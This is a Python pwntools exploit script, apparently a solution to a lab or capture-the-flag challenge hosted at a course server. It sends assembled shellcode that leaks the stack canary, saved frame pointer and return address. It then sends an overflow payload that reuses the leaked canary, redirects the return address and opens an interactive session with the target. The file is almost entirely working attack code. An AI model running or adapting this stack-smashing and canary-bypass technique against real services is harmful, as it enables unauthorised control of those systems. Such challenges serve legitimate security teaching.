#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

payload = asm("endbr64")
payload += asm("push rbp")
payload += asm("mov rbp,rsp")
payload += asm("mov QWORD PTR [rbp-0x18],rdi")

payload += asm("mov r8, QWORD PTR [rbp-0x18]")

payload += asm("lea rax,[rbp+0x8]")
payload += asm("mov rcx,QWORD PTR [rax]")

payload += asm("lea rax,[rbp]")
payload += asm("mov rdx,QWORD PTR [rax]")

payload += asm("lea rax,[rdx-0x8]")
payload += asm("mov rsi,QWORD PTR [rax]")

payload += asm("lea rax,[rip+0x8]")

payload += asm("mov rdi,rax")

payload += asm("call r8")

payload += asm("leave")
payload += asm("ret")

payload += b'canary = %016lx\nrbp = %016lx\nra = %016lx\n'

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

print(r.recvuntil(b'canary = ').decode("utf-8"), end = '')
canary = r.recvline(keepends=False)
print(canary.decode('utf-8'))

print(r.recvuntil(b'rbp = ').decode("utf-8"), end = '')
rbp = r.recvline(keepends=False)
print(rbp.decode('utf-8'))

print(r.recvuntil(b'ra = ').decode("utf-8"), end = '')
ra = r.recvline(keepends=False)
print(ra.decode('utf-8'))

ans = b'0'*24
ans += p64(int(canary, 16))
ans += p64(int(rbp, 16))
ans += p64(int(ra, 16)+0xab)
ans += p64(0x0000000000000000)*10

print(r.recvuntil(b'your answer? ').decode("utf-8"), end = '')
print(ans)
r.send(ans)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
